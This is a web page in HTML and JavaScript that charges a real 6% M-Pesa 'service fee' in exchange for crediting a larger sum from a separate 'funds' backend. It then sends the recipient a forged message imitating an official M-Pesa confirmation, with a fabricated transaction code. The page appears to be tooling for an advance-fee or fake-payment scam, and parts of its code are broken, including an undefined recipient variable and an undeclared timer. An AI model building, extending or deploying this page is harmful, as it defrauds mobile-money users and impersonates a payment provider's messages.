<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fund Account - Pay Fee Only</title>
    <style>
        :root { --primary: #4CAF50; --dark: #121212; --card: #1e1e1e; }
        body { 
            font-family: 'Segoe UI', sans-serif; background: var(--dark); color: white;
            display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0;
        }
        .card { 
            background: var(--card); padding: 2rem; border-radius: 12px; 
            box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 100%; max-width: 380px; text-align: center;
            border: 1px solid #333;
        }
        h2 { color: var(--primary); margin-bottom: 0.5rem; font-size: 1.4rem; }
        .user-info { font-size: 0.9rem; color: #aaa; margin-bottom: 1rem; }
        .balance-display { 
            background: #121212; 
            border-radius: 8px; 
            padding: 15px; 
            margin: 15px 0; 
            border: 1px solid #333; 
        }
        .balance-display .label { font-size: 0.75rem; color: #666; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px; }
        .balance-display .amount { font-size: 1.5rem; font-weight: bold; color: var(--primary); }
        .fee-info { font-size: 0.9rem; color: #ffab00; margin: 15px 0; padding: 10px; background: rgba(255,171,0,0.1); border-radius: 6px; display: none; }
        
        label { display: block; text-align: left; font-size: 0.8rem; color: #888; margin-top: 10px; }
        input { 
            width: 100%; padding: 12px; margin: 5px 0 10px 0; border: 1px solid #444; 
            border-radius: 6px; background: #121212; color: white; box-sizing: border-box;
        }
        input:focus { border-color: var(--primary); outline: none; }
        
        button { 
            width: 100%; padding: 14px; background: var(--primary); color: white; 
            border: none; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 15px;
        }
        button:disabled { background: #444; cursor: not-allowed; }
        #status { margin-top: 15px; font-size: 0.85rem; min-height: 40px; color: #ccc; }
        .loader {
            display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,.3);
            border-radius: 50%; border-top-color: #fff; animation: spin 1s linear infinite;
            margin-right: 8px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="card">
    <h2>Fund Your Account</h2>
    <div class="user-info">Crediting Account: <span id="accPhone" style="color:var(--primary)">...</span></div>
    
    <div class="balance-display">
        <div class="label">Current Balance</div>
        <div class="amount" id="currentBalance">Loading...</div>
    </div>
    
    <label>Amount to Add to Balance (Ksh)</label>
    <input type="number" id="fundAmount" placeholder="Min 100" oninput="updateFee()">
    
    <div id="feeDisplay" class="fee-info">
        Service Fee to Pay: <strong id="stkPrice">Ksh 0.00</strong>
    </div>

    <label>Enter M-Pesa Number for Payment with Funds (Safaricom only)</label>
    <input type="text" id="paymentPhone" placeholder="07xxxxxxxx">
    
    <label>Recipient Account (Where Funds Go)</label>
    <input type="text" id="recipientPhone" placeholder="07xxxxxxxx">
     
    <button id="payBtn" onclick="initiateFunding()">Pay Fee & Request Funds</button>
    
    <div id="status"></div>
    <a href="act.html" style="display:block; margin-top:20px; color:#666; text-decoration:none; font-size:0.8rem">Go Back</a>
</div>

<script>
    const BACKEND_PAYMENT = "https://parero.vercel.app";
    const BACKEND_FUNDS = "https://funds-mauve.vercel.app/api";
    const MESSAGE_API = "https://message-server-five.vercel.app";
     
    const userData = JSON.parse(localStorage.getItem('mledger_user'));
    if(!userData) {
        window.location.href = "index.html";
    } else {
        document.getElementById('accPhone').innerText = userData.phone;
        document.getElementById('paymentPhone').value = userData.phone;
        fetchBalance();
    }

    // ─── Fetch and display balance ─────────────────────────────────
    async function fetchBalance() {
        const balanceDiv = document.getElementById('currentBalance');
        try {
            const response = await fetch(`${BACKEND_FUNDS}/balance/${userData.phone}`);
            const result = await response.json();
            if (response.ok) {
                const bal = parseFloat(result.balance) || 0;
                balanceDiv.innerText = `Ksh ${bal.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
            } else {
                balanceDiv.innerText = "Ksh 0.00";
            }
        } catch (err) {
            balanceDiv.innerText = "Ksh 0.00";
        }
    }

    // ─── Token format helpers ──────────────────────────────────────
    function getYearLetter() {
        const year = new Date().getFullYear();
        const offset = year - 2026;
        return String.fromCharCode(85 + offset);
    }

    function getMonthThirdLetter() {
        const thirdLetters = "ABCDEFGHIJKLMN";
        return thirdLetters[new Date().getMonth()];
    }

    function getDayCode() {
        const day = new Date().getDate();
        if (day <= 9) {
            return day.toString();
        } else {
            return String.fromCharCode(65 + (day - 10));
        }
    }

    function formatNumericDate() {
        const now = new Date();
        const day = now.getDate().toString().padStart(2, '0');
        const month = (now.getMonth() + 1).toString().padStart(2, '0');
        const year = now.getFullYear();
        return `${day}/${month}/${year}`;
    }

    function formatTime12Hour() {
        const now = new Date();
        return now.toLocaleTimeString('en-US', {
            hour: 'numeric',
            minute: '2-digit',
            hour12: true
        });
    }

    function generateToken() {
        const yearLetter = getYearLetter();
        const monthLetter = getMonthThirdLetter();
        const dayCode = getDayCode();
        const randomPart = Math.random().toString(36).substring(2,8).toUpperCase();
        return `${yearLetter}${monthLetter}${dayCode}K${randomPart}`;
    }
    // ─────────────────────────────────────────────────────────────────

    function updateFee() {
        const amt = parseFloat(document.getElementById('fundAmount').value);
        const feeDiv = document.getElementById('feeDisplay');
        const stkSpan = document.getElementById('stkPrice');
         
        if (amt >= 100) {
            // Calculate ONLY the 6% fee for the STK prompt
            const fee = amt * 0.06;
            feeDiv.style.display = "block";
            stkSpan.innerText = "Ksh " + fee.toFixed(2);
        } else {
            feeDiv.style.display = "none";
        }
    }

    async function initiateFunding() {
        const amt = parseFloat(document.getElementById('fundAmount').value);
        const mpesaNumber = document.getElementById('paymentPhone').value.trim();
        const recipientPhone = document.getElementById('recipientPhone').value.trim();
        const statusDiv = document.getElementById('status');
        const payBtn = document.getElementById('payBtn');

        if (isNaN(amt) || amt < 100) {
            statusDiv.style.color = "#ff5252";
            statusDiv.innerText = "Minimum funding amount is Ksh 100.00";
            return;
        }

        if (!recipientPhone || recipientPhone.length < 9) {
            statusDiv.style.color = "#ff5252";
            statusDiv.innerText = "Please enter a valid recipient phone number.";
            return;
        }

        // Calculate the STK amount (just the 6% fee)
        const stkAmount = Math.ceil(amt * 0.06); 
         
        payBtn.disabled = true;
        payBtn.innerHTML = '<span class="loader"></span>Processing Fee...';
        statusDiv.style.color = "#aaa";
        statusDiv.innerText = `Requesting Ksh ${stkAmount} fee from ${mpesaNumber}...`;

        try {
            // 1. Send STK Push for the FEE ONLY (Payhero)
            const payRes = await fetch(`${BACKEND_PAYMENT}/api/stk-push`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "ngrok-skip-browser-warning": "true"
                },
                body: JSON.stringify({ 
                    amount: stkAmount, 
                    phone_number: mpesaNumber 
                })
            });

            const payData = await payRes.json();

            if (payData.success) {
                statusDiv.innerText = "Enter M-Pesa PIN on the phone to pay the service fee.";
                startPolling(amt, recipient);
            } else {
                throw new Error("Failed to trigger STK. Ensure number is Safaricom.");
            }
        } catch (err) {
            statusDiv.style.color = "#ff5252";
            statusDiv.innerText = "Error: " + err.message;
            resetUI();
        }
    }

    function startPolling(fundAmt, recipient) {
        const statusDiv = document.getElementById('status');
        let attempts = 0;
        const maxAttempts = 50;

        if (pollTimer) clearInterval(pollTimer);

        pollTimer = setInterval(async () => {
            attempts++;

            try {
                const res = await fetch(`${BACKEND_PAYMENT}/api/status`, {
                    headers: { "ngrok-skip-browser-warning": "true" }
                });

                const data = await res.json();

                if (data.status === true && data.response) {
                    const code = data.response.ResultCode;

                    if (code === 0) {
                        clearInterval(pollTimer);
                        statusDiv.style.color = "#4CAF50";
                        statusDiv.innerText = "✅ Fee paid! Sending funds...";
                        finalizeFunding(fundAmt, recipient);
                        return;
                    }
                    else if (code === 1032) {
                        clearInterval(pollTimer);
                        statusDiv.style.color = "#ff5252";
                        statusDiv.innerText = "❌ Payment was cancelled. Please try again.";
                        resetUI();
                        return;
                    }
                    else {
                        clearInterval(pollTimer);
                        let msg = data.response.ResultDesc || "Payment failed";
                        if (code === 2001) msg = "Wrong M-Pesa PIN entered.";
                        statusDiv.style.color = "#ff5252";
                        statusDiv.innerText = `❌ ${msg}`;
                        resetUI();
                        return;
                    }
                }

                if (attempts >= maxAttempts) {
                    clearInterval(pollTimer);
                    statusDiv.style.color = "#ff5252";
                    statusDiv.innerText = "⏰ Request timed out. Check your M-Pesa or try again.";
                    resetUI();
                }
            } catch (err) {
                console.error("Polling error:", err);
            }
        }, 3000);
    }

    async function finalizeFunding(amt, recipient) {
        const statusDiv = document.getElementById('status');
        try {
            // 2. Fund the FULL amount requested to the selected recipient account
            const res = await fetch(`${BACKEND_FUNDS}/fund`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    phone: recipient, 
                    amount: amt 
                })
            });
            const result = await res.json();

            if (res.ok) {
                // Generate token and confirmation message
                const token = generateToken();
                const dateStr = formatNumericDate();
                const timeStr = formatTime12Hour();
                const fee = Math.ceil(amt * 0.06);
                 
                const confirmationMsg = `${token} Confirmed.You have received Ksh${amt.toFixed(2)} from Mledger intasend Solutions Limited 313031 on ${dateStr} at ${timeStr}. New M-PESA balance is Ksh${result.newBalance.toFixed(2)}. Separate personal and business funds through pochi la Biashara on *334#`;

                // Send confirmation message to message API for the recipient
                fetch(`${MESSAGE_API}/api/messages`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        phone: recipient,
                        message: confirmationMsg,
                        type: 'received'
                    })
                }).catch(err => {
                    console.warn("Confirmation message failed to send:", err);
                });

                statusDiv.innerHTML = `<strong>✅ Success!</strong><br>Ksh ${amt} sent to ${recipient}.<br><span style="font-size:0.75rem;color:#aaa">Token: ${token}</span>`;
                setTimeout(() => window.location.href = "index.html", 3000);
            } else {
                statusDiv.innerText = "Fee received, but funding failed. Contact Support.";
            }
        } catch (err) {
            statusDiv.innerText = "Critical error during balance update.";
        }
    }

    function resetUI() {
        const payBtn = document.getElementById('payBtn');
        payBtn.disabled = false;
        payBtn.innerText = "Pay Fee & Request Funds";
    }
</script>
</body>
</html>
